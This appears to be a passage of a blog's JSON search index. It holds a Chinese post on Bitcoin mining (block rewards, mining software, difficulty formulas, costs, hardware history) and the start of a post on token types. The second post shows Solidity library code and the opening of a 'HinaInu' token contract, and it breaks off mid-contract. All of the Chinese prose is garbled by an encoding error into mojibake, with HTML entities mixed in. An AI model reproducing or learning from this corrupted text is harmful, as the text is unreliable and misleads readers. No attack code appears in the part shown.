åˆ°æ¯”ç‰¹å¸åŒºå—é“¾çš„è¿‡ç¨‹ã€‚\nä»ŽæŠ€æœ¯ä¸Šæ¥è®²ï¼Œä»»ä½•äººéƒ½å¯ä»¥å‚ä¸Žåˆ°æ¯”ç‰¹å¸æŒ–çŸ¿çš„è¿‡ç¨‹ä¸­ï¼Œä½†å¤šå¹´æ¥æ¯”ç‰¹å¸æŒ–çŸ¿å˜å¾—è¶Šæ¥è¶Šç«žäº‰ï¼Œä»¥è‡³äºŽçŸ¿å·¥é€šå¸¸éœ€è¦æ˜‚è´µçš„ç¡¬ä»¶å’Œä½Žæˆæœ¬çš„ç”µåŠ›æ‰èƒ½ä»Žæ¯”ç‰¹å¸æŒ–çŸ¿ä¸­èŽ·åˆ©ã€‚åŒºå—å¥–åŠ±æ¯ 210,000 ä¸ªåŒºå—ï¼ˆæˆ–å¤§çº¦æ¯å››å¹´ï¼‰å‡åŠã€‚2009å¹´æ˜¯50ï¼Œ2013å¹´å¥–åŠ±é‡‘é¢ä¸‹é™åˆ°25ï¼Œ2016å¹´å˜æˆ12.5ï¼Œå› æ­¤ä»Ž 2024 å¹´å¼€å§‹ï¼Œä»–ä»¬å°†æ¯å—èµšå– 3.125 ä¸ªæ¯”ç‰¹å¸ã€‚æ¯”ç‰¹å¸çŸ¿å·¥éœ€è¦ä¸€ä¸ªåŠ å¯†è´§å¸é’±åŒ…æ¥å­˜å‚¨åœ¨é‡‡çŸ¿è¿‡ç¨‹ä¸­èŽ·å¾—çš„ç¡¬å¸ï¼Œé’±åŒ…æ˜¯å­˜å‚¨å‘é€æˆ–æŽ¥æ”¶åŠ å¯†è´§å¸æ‰€éœ€çš„ç§é’¥çš„ç¡¬ä»¶è®¾å¤‡æˆ–è½¯ä»¶åº”ç”¨ç¨‹åºã€‚çŸ¿å·¥éœ€è¦æŒ–çŸ¿è½¯ä»¶ä¸ŽæŒ–çŸ¿ç¡¬ä»¶æŒ–çŸ¿ç¡¬ä»¶é€šå¸¸æ˜¯æŒ‡ä¸“é—¨ä¸ºæŒ–çŸ¿è€Œè®¾è®¡çš„å›¾å½¢å¤„ç†å•å…ƒæˆ– GPUï¼Œæˆ–ä¸“ç”¨é›†æˆç”µè·¯æˆ–ASICã€‚\næ¯”ç‰¹å¸é’±åŒ…æ¯”ç‰¹å¸æŒ–æŽ˜è½¯ä»¶æ˜¯ä½ ç”¨æ¥åœ¨ä½ ä½¿ç”¨çš„ç¡¬ä»¶å’Œæ¯”ç‰¹å¸åŒºå—é“¾ä¹‹é—´è¿›è¡Œé€šä¿¡çš„è½¯ä»¶ã€‚ä¸€èˆ¬å¯ä»¥é‡‡ç”¨ä¸¤ç§å­˜å‚¨æ¯”ç‰¹å¸çš„é’±åŒ…ï¼Œä¸€ç§æ˜¯æ‰˜ç®¡ï¼Œå¦ä¸€ç§æ˜¯æŒæœ‰è‡ªå·±é’±åŒ…çš„ç§é’¥çš„é’±åŒ…ã€‚BitPayã€Armory å’Œ Breadwallet éƒ½æ˜¯æ˜“äºŽä½¿ç”¨çš„æ¯”ç‰¹å¸é’±åŒ…ã€‚\næ¯”ç‰¹å¸æŒ–çŸ¿è½¯ä»¶CGMiner\nè¯¥è½¯ä»¶å¯åœ¨ Windowsã€Mac å’Œ Linux ä¸Šè¿è¡Œï¼Œå¯èƒ½æ˜¯ç›®å‰æ¯”ç‰¹å¸çŸ¿å·¥æœ€å¸¸ç”¨çš„è½¯ä»¶ã€‚è¯¥è½¯ä»¶åŒ…æ‹¬è¿œç¨‹æŽ¥å£åŠŸèƒ½ã€å¤š GPU æ”¯æŒã€æ–°å—çš„è‡ªæˆ‘æ£€æµ‹ã€é£Žæ‰‡é€Ÿåº¦æŽ§åˆ¶å’Œ CPU æŒ–æŽ˜æ”¯æŒã€‚\nBFGMiner\nè¯¥æ¯”ç‰¹å¸è½¯ä»¶åŸºäºŽå¼€æºå¹³å°ã€‚å®ƒå¸¦æœ‰ä¸€ä¸ªUSBæŽ¥å£å’Œæ”¯æŒçš„FPGAæ¿å’ŒASICèŠ¯ç‰‡ï¼Œå¯ç”¨äºŽç¼–ç¨‹å’Œé€šä¿¡ã€‚å®ƒæœ‰å‡ ä¸ªé‡è¦çš„ç‰¹æ€§ï¼Œæ¯”å¦‚åŒ…æ‹¬èƒ½å¤Ÿé€‰æ‹©å…·æœ‰æœ€é«˜æœ‰æ•ˆå“ˆå¸ŒçŽ‡çš„é¢‘çŽ‡ï¼Œå¹¶ä¸”ç”±äºŽå®ƒæ˜¯å¼€æºçš„ï¼Œå®ƒä¸éœ€è¦è®¸å¯è¯å¹¶ä¸”å¯ä»¥åœ¨ Windowsã€Mac å’Œ Linux ä¸Šè¿è¡Œã€‚\nEasyMiner\nè¯¥è½¯ä»¶å¯åœ¨ Windowsã€Android å’Œ Ubuntu (Linux) ç³»ç»Ÿä¸Šè¿è¡Œã€‚å®ƒæœ‰ä¸€ä¸ªä¸Ž CGminer è½¯ä»¶é…åˆä½¿ç”¨çš„å›¾å½¢ç”¨æˆ·ç•Œé¢ã€‚ç›¸å¯¹ä¼šæ›´åŠ å‹å¥½ã€‚\nMulitMinerè¿™æ˜¯å¦ä¸€ä¸ªå¯è§†åŒ–ç•Œé¢ï¼Œä½†è¿™æ¬¡æ˜¯é’ˆå¯¹ BFGMinerã€‚è¿™ä¸ªç•Œé¢çš„å¸ƒå±€éžå¸¸ç›´è§‚ï¼Œå®ƒéžå¸¸é€‚åˆæ¯”ç‰¹å¸æŒ–çŸ¿æ–°æ‰‹ï¼Œå› ä¸ºå®ƒæœ‰ä¸€ä¸ªæ˜“æ“ä½œçš„æŽ§åˆ¶é¢æ¿ã€‚\næŒ–çŸ¿éš¾åº¦æŒ–çŸ¿éš¾åº¦æ¯ 2,016 ä¸ªåŒºå—æˆ–å¤§çº¦æ¯ä¸¤å‘¨æ›´æ”¹ä¸€æ¬¡ã€‚éšåŽçš„éš¾åº¦çº§åˆ«å–å†³äºŽçŸ¿å·¥åœ¨å‰ä¸€ä¸ªå‘¨æœŸä¸­çš„æ•ˆçŽ‡ã€‚æŒ–çŸ¿éš¾åº¦è¿˜å—åˆ°åŠ å…¥æ¯”ç‰¹å¸ç½‘ç»œçš„æ–°çŸ¿å·¥æ•°é‡çš„å½±å“ï¼Œå› ä¸ºå®ƒå¢žåŠ äº†å“ˆå¸ŒçŽ‡æˆ–éƒ¨ç½²ç”¨äºŽæŒ–æŽ˜åŠ å¯†è´§å¸çš„è®¡ç®—èƒ½åŠ›ã€‚æŒ–å‡ºåŒºå—çš„é€Ÿåº¦å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè€Œæ˜¯éšç€æŒ–çŸ¿éš¾åº¦çš„å˜åŒ–åœ¨10åˆ†é’Ÿä¸Šä¸‹æµ®åŠ¨ï¼Œ æŒ–çŸ¿éš¾åº¦è¶Šå¤§ï¼Œå‡ºå—æ—¶é—´å°±è¶Šé•¿ã€‚2013 å¹´å’Œ 2014 å¹´ï¼Œéšç€æ¯”ç‰¹å¸ä»·æ ¼ä¸Šæ¶¨ï¼Œæ›´å¤šçŸ¿å·¥åŠ å…¥å…¶ç½‘ç»œï¼Œå‘çŽ°ä¸€ä¸ªäº¤æ˜“åŒºå—çš„å¹³å‡æ—¶é—´ä»Ž 10 åˆ†é’Ÿä¸‹é™åˆ° 9 åˆ†é’Ÿã€‚\n2020å¹´8æœˆæŒ–çŸ¿éš¾åº¦è¶…è¿‡16ä¸‡äº¿ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè®¡ç®—æœºäº§ç”Ÿä½ŽäºŽç›®æ ‡çš„å“ˆå¸Œå€¼çš„æœºä¼šæ˜¯ 16 ä¸‡äº¿åˆ†ä¹‹ä¸€ã€‚diffculty &#x3D; difficulty_1_target &#x2F; targetæ­¤å¤„çš„ difficulty_1_target ä¸ºä¸€ä¸ªå¸¸æ•°ï¼Œéžå¸¸å¤§çš„ä¸€ä¸ªæ•°å­—ï¼ˆ 2^(256-32)âˆ’1 ï¼‰ã€‚è¡¨ç¤ºæŒ–çŸ¿çš„åˆå§‹éš¾åº¦ï¼Œç›®æ ‡å€¼è¶Šå°ï¼ŒåŒºå—ç”Ÿæˆéš¾åº¦è¶Šå¤§ã€‚\næ¯”ç‰¹å¸ç³»ç»Ÿä¸­åŒºå—çš„ç”Ÿäº§é€Ÿåº¦æ˜¯æ ¹æ®ä¹‹å‰äº§ç”ŸåŒºå—çš„é€Ÿåº¦è°ƒæ•´ï¼Œä¹‹å‰å‡ºå—é€Ÿåº¦å¤§äºŽ10åˆ†é’Ÿï¼Œåˆ™è®¤ä¸ºéœ€è¦é™ä½Žéš¾åº¦ï¼Œåˆ™éœ€è¦æé«˜ç¬¬ä¸€ä¸ªå…¬å¼ä¸­targetçš„å€¼ï¼Œè€Œtargetåˆ™é€šè¿‡å¦‚ä¸‹å…¬å¼è®¡ç®—ï¼štarget &#x3D; current_target * ( actual time &#x2F; excepted time )\næ¯”ç‰¹å¸æŒ–çŸ¿çš„ä¸‰ä¸ªä¸»è¦æˆæœ¬\nç”µåŠ›ï¼šæ ¹æ®å¾ˆå¤šæ•°æ®ç»™å‡ºçš„ä¸€äº›ä¼°è®¡ï¼Œç”µåŠ›æˆæœ¬å°†ä¼šå æ¯”ç‰¹å¸æŒ–çŸ¿æˆæœ¬çš„ 90%ã€‚\næŒ–çŸ¿ç³»ç»Ÿï¼šå°å¼ç”µè„‘å’Œå¸¸è§„æ¸¸æˆç³»ç»Ÿä¸é€‚åˆæˆ–ä¸é€‚åˆæ¯”ç‰¹å¸æŒ–çŸ¿ï¼Œè¯¥è¿‡ç¨‹å¯èƒ½ä¼šä½¿æ­¤ç±»ç³»ç»Ÿå‡æ¸©å¹¶å¯¼è‡´å‡ºçŽ°å¸¦å®½é—®é¢˜ã€‚\n\nä¸“ç”¨é›†æˆèŠ¯ç‰‡ï¼ˆASICï¼‰ç³»ç»Ÿï¼šæ˜¯æ¯”ç‰¹å¸æŒ–çŸ¿çš„å®šåˆ¶æœºå™¨ï¼Œæ˜¯æ¯”ç‰¹å¸çŸ¿å·¥çš„ä¸»è¦åŸºç¡€è®¾æ–½æŠ•èµ„ã€‚æ­¤ç±»æœºå™¨çš„ä»·æ ¼èŒƒå›´ä»Ž 4,000 ç¾Žå…ƒåˆ° 12,000 ç¾Žå…ƒä¸ç­‰ã€‚å³ä½¿æˆæœ¬å¦‚æ­¤ä¹‹é«˜ï¼Œå•ä¸ªé…å¤‡ ASIC çš„ç³»ç»Ÿç”Ÿæˆçš„æ¯”ç‰¹å¸ä¹Ÿå°‘äºŽå•ä¸ªæ¯”ç‰¹å¸ã€‚æ¯”ç‰¹å¸çŸ¿å·¥å°†æ•°åƒä¸ª ASIC ç³»ç»Ÿç»„ç»‡æˆ 24â„7 è¿è¡Œçš„çŸ¿æ± ï¼Œä»¥ç”Ÿæˆè§£å†³å“ˆå¸Œéš¾é¢˜æ‰€éœ€çš„ 64 ä½åå…­è¿›åˆ¶æ•°ã€‚\n\nç½‘ç»œåŸºç¡€è®¾æ–½ï¼šç½‘ç»œé€Ÿåº¦å¯¹æ¯”ç‰¹å¸æŒ–æŽ˜è¿‡ç¨‹æ²¡æœ‰æ˜¾ç€å½±å“ã€‚ä½†æ˜¯ï¼Œæ‹¥æœ‰ 24â„7 ä¸é—´æ–­çš„ Internet è¿žæŽ¥éžå¸¸é‡è¦ã€‚è¯¥è¿žæŽ¥è¿˜åº”è¯¥æœ‰æ¥è‡ªé™„è¿‘çŸ¿æ± çš„å»¶è¿Ÿã€‚ä¸“ç”¨ç½‘ç»œå‡å°‘äº†å¤–éƒ¨ä¾èµ–å¹¶ç¡®ä¿å°†å»¶è¿Ÿé™è‡³æœ€ä½Žã€‚ç¦»çº¿å¹¶ä¸ä¸€å®šä¼šåœæ­¢åŒæ­¥äº¤æ˜“çš„è¿‡ç¨‹ã€‚ä½†å®ƒä¼šä½¿è¯¥è¿‡ç¨‹è€—æ—¶ï¼Œå¹¶ä¸”å¯èƒ½åœ¨è¿žæŽ¥æ¢å¤åŽå®¹æ˜“å‡ºé”™ã€‚\n\næŒ–çŸ¿åŽ†å²æ—¢ç„¶æåˆ°æŒ–çŸ¿ï¼ŒæŒ–çŸ¿ä¹Ÿæœ‰è‡ªå·±çš„åŽ†å²æ¼”å˜ï¼Œåœ¨ç¡¬ä»¶ä¸Šå°¤ä¸ºçªå‡ºï¼Œå®žé™…çš„æ¯”ç‰¹å¸æŒ–çŸ¿è¿‡ç¨‹æ˜¯é€šè¿‡æ¯”ç‰¹å¸æŒ–çŸ¿ç¡¬ä»¶å®Œæˆçš„ã€‚CUPæŒ–çŸ¿2009å¹´1æœˆ3æ—¥ï¼Œä¸­æœ¬èªåœ¨èŠ¬å…°èµ«å°”è¾›åŸºçš„ä¸€ä¸ªå°åž‹æœåŠ¡å™¨ä¸Šä½¿ç”¨CPUæŒ–å‡ºäº†æ¯”ç‰¹å¸çš„ç¬¬ä¸€ä¸ªåŒºå—â€”â€”åˆ›ä¸–åŒºå—ï¼ˆGenesis Blockï¼‰ï¼Œå¹¶èŽ·å¾—äº†50ä¸ªæ¯”ç‰¹å¸çš„å¥–åŠ±ã€‚ä½†æ˜¯éšç€å¯¹æŒ–çŸ¿ç®—æ³•çš„æ·±å…¥ç ”ç©¶ï¼ŒæŒ–çŸ¿éƒ½æ˜¯åœ¨é‡å¤ä¸€æ ·çš„å·¥ä½œï¼Œè€ŒCPUä½œä¸ºé€šç”¨æ€§è®¡ç®—å•å…ƒï¼Œæ‰€ä»¥é€‰ç”¨GPUæŒ–çŸ¿æ›´ä¸ºåˆé€‚ã€‚\nGPUæŒ–çŸ¿2010å¹´ï¼ŒGPUæŒ–çŸ¿äº§ç”Ÿï¼ŒGPUå¯ä»¥è½»æ˜“çš„è¿›è¡Œæ•°ç™¾ä¸ªçº¿ç¨‹çš„æ•´æ•°è®¡ç®—å¹¶å‘ï¼Œä¸€ä¸ªGPUæ˜¾å¡ç›¸å½“äºŽå‡ åä¸ªCPUï¼Œç®—åŠ›å¾—åˆ°äº†æ˜Žæ˜¾æå‡ã€‚\nASICæŒ–çŸ¿ASICï¼ˆApplication-Specific Integrated Circuitï¼‰æŒ‡çš„æ˜¯ä¸“é—¨è®¾è®¡æ¥å®Œæˆç‰¹å®šè®¡ç®—ä»»åŠ¡çš„é›†æˆç”µè·¯ï¼ŒASICçŸ¿æœºç›¸å½“äºŽä¸“é—¨ä¸ºæ•°å­—è´§å¸æŒ–çŸ¿å®šåˆ¶çš„é›†æˆç”µè·¯è®¾å¤‡ã€‚\næŒ–çŸ¿æŒ–çŸ¿ä¸­æœ‰ä¸ªå®šä¹‰æ˜¯ç®—åŠ›ï¼Œä¸€èˆ¬ä»¥æ¯ç§’è¿›è¡Œå¤šå°‘æ¬¡ hash è®¡ç®—ä¸ºå•ä½ï¼Œè®°ä¸º h&#x2F;sã€‚æ¯”ç‰¹å¸ç½‘ç»œæ¯10åˆ†é’Ÿç”Ÿæˆä¸€ä¸ªåŒºå—ï¼Œè®°å½•å½“å‰10åˆ†é’Ÿç½‘ç»œä¸­æ‰€æœ‰äº¤æ˜“çš„è´¦æœ¬è®°å½•ï¼Œ\næ¯”ç‰¹å¸ç³»ç»Ÿå‡ºä¸€é“æ•°å­¦é¢˜ï¼Œæ¯”ç‰¹å¸ä½¿ç”¨SHA256è®¡ç®—hashï¼ŒçŸ¿å·¥ä½¿ç”¨æŒ–çŸ¿æœºè¿›è¡Œhashå‡½æ•°éšæœºç¢°æ’žã€‚æ¯”ç‰¹å¸é’±åŒ…ä¸­çš„äº¤æ˜“æ•°æ®ä¼šä¸æ–­ä¸Šä¼ ï¼Œå¹¶æŠŠæ•°æ®æ”¾åˆ°ç¼“å­˜æ± ä¸­ï¼Œç¼“å­˜æ± ä¸­æœ‰å„ç§æœªæ‰“åŒ…çš„äº¤æ˜“äº‹åŠ¡æ•°æ®ï¼Œå¹¶ä¸”ç¼“å­˜æ± å¯¹å„ä¸ªæŒ–çŸ¿ç¨‹åºæ˜¯å¯è§çš„ã€‚æ€»çš„æ¥è¯´å°±æ˜¯ç”¨å“ˆå¸Œå€¼ç¢°æ’žå“ˆå¸Œå€¼Hashï¼ˆBlock Headerï¼‰&lt;&#x3D; targetæ¯”ç‰¹å¸é‡‡ç”¨çš„å“ˆå¸Œç®—æ³•æ˜¯ SHA-256 ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€åŽä¼šäº§ç”Ÿ256ä½çš„è¾“å‡ºï¼Œä¸€å…±2^256ç§å¯èƒ½çš„å–å€¼ã€‚è¿™å¼ å›¾æ¸…æ™°æ˜“æ‡‚ï¼š\n\n\n\n\n\n\n\n\n\n\nSabrina Jiang Â© Investopedia 2021\nä¸€ä¸ªç¬¦åˆè¦æ±‚çš„Block Hashç”±Nä¸ªå‰å¯¼é›¶æž„æˆï¼Œé›¶çš„ä¸ªæ•°å–å†³äºŽç½‘ç»œçš„éš¾åº¦å€¼ã€‚çŸ¿å·¥é€šè¿‡å°½å¯èƒ½å¿«åœ°éšæœºç”Ÿæˆå°½å¯èƒ½å¤šçš„â€œéšæœºæ•°â€æ¥è¿›è¡Œè¿™äº›çŒœæµ‹ã€‚\nå†äº†è§£ä¸€ä¸ªåè¯ï¼Œnonceï¼ˆnumber only used onceï¼‰æ˜¯ç”Ÿæˆ 64 ä½åå…­è¿›åˆ¶æ•°å­—çš„å…³é”®ï¼Œåœ¨æ¯”ç‰¹å¸æŒ–çŸ¿ä¸­ï¼Œnonce çš„å¤§å°ä¸º 32 ä½ã€‚ç¬¬ä¸€ä¸ªéšæœºæ•°ç”Ÿæˆå°äºŽæˆ–ç­‰äºŽç›®æ ‡å“ˆå¸Œçš„å“ˆå¸Œçš„çŸ¿å·¥å°†èŽ·å¾—è¯¥åŒºå—ã€‚æŸ¥çœ‹Blockchain.infoç½‘ç«™å¯ä»¥çœ‹åˆ°ï¼š\n\n\n\n\n\n\n\n\n\n\nInvestopediaä¹Ÿç»™å‡ºäº†ä¸€ä¸ªå¯ä»¥ç”¨äºŽä¼°ç®—æˆæœ¬å’Œæ”¶ç›Šçš„ç½‘ç«™ï¼š https://www.cryptocompare.com/mining/calculator/btc?HashingPower=15&amp;HashingUnit=TH%2Fs&amp;PowerConsumption=0&amp;CostPerkWh=0&amp;MiningPoolFee=1\n\näº¤æ˜“æŒ–çŸ¿é™¤æŒ–çŸ¿ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨äº¤æ˜“æŒ–çŸ¿ï¼Œç”¨æˆ·åœ¨è¯¥äº¤æ˜“å¯¹å½“æ—¥æ€»ä¸‹å•ç¬”æ•°å°äºŽç­‰äºŽ 50 å¹¶ä¸”ç”¨æˆ·å®ŒæˆKYCï¼ˆæäº¤ä¸ªäººä¿¡æ¯å¹¶ä¸”é€šè¿‡å¹³å°å®¡æ ¸ï¼‰ï¼Œåˆ™è¯¥ç”¨æˆ·çš„å½“æ—¥äº¤æ˜“æŒ–çŸ¿åŸºæ•°ä¸ºï¼šå½“æ—¥è¯¥ç”¨æˆ·åœ¨è¯¥äº¤æ˜“å¯¹çš„æ€»äº¤æ˜“é‡\n","slug":"bitcoin mining","date":"2022-08-01T11:08:14.973Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"f79410ff40b06d8b4967a5cc63af85a3","title":"Learn of three token","content":"\n\n\näº†è§£äº†ä¸€ä¸‹inuç³»åˆ—tokenä»¥åŠFee on Transfer Token\nä¸‰ç§tokençš„å­¦ä¹ 1.ERC-20 Tokenæ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œçœ‹çœ‹ä»£ç å³å¯ï¼Œä¸å†èµ˜è¿°\n2.INU TokenCodepragma solidity ^0.6.12;\nabstract contract Context &#123;\n    function _msgSender() internal view virtual returns (address payable) &#123;\n        return msg.sender;\n    &#125;\n    function _msgData() internal view virtual returns (bytes memory) &#123;\n        this;\n        return msg.data;\n    &#125;\n&#125;\ninterface IERC20 &#123;\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is\n     * zero by default.\n     *\n     * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an &#123;Approval&#125; event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to &#123;approve&#125;. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\nlibrary SafeMath &#123;\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    &#125;\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) &#123;\n        require(b &lt;= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return div(a, b, \"SafeMath: division by zero\");\n    &#125;\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) &#123;\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    &#125;\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) &#123;\n        require(b != 0, errorMessage);\n        return a % b;\n    &#125;\n&#125;\n\nlibrary Address &#123;\n    function isContract(address account) internal view returns (bool) &#123;\n        bytes32 codehash;\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        assembly &#123; codehash := extcodehash(account) &#125;\n        return (codehash != accountHash &amp;&amp; codehash != 0x0);\n    &#125;\n    function sendValue(address payable recipient, uint256 amount) internal &#123;\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n        (bool success, ) = recipient.call&#123; value: amount &#125;(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    &#125;\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) &#123;\n      return functionCall(target, data, \"Address: low-level call failed\");\n    &#125;\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) &#123;\n        return _functionCallWithValue(target, data, 0, errorMessage);\n    &#125;\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) &#123;\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-Address-functionCallWithValue-address-bytes-uint256-&#125;[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) &#123;\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        return _functionCallWithValue(target, data, value, errorMessage);\n    &#125;\n\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) &#123;\n        require(isContract(target), \"Address: call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.call&#123; value: weiValue &#125;(data);\n        if (success) &#123;\n            return returndata;\n        &#125; else &#123;\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) &#123;\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                // solhint-disable-next-line no-inline-assembly\n                assembly &#123;\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                &#125;\n            &#125; else &#123;\n                revert(errorMessage);\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\ncontract Ownable is Context &#123;\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor () internal &#123;\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    &#125;\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() &#123;\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner &#123;\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\n\n\n\ncontract HinaInu is Context, IERC20, Ownable &#123;\n    using SafeMath for uint256;\n    using Address for address;\n\n    mapping (address => uint256) private _rOwned;\n    mapping (address => uint256) private _tOwned;\n    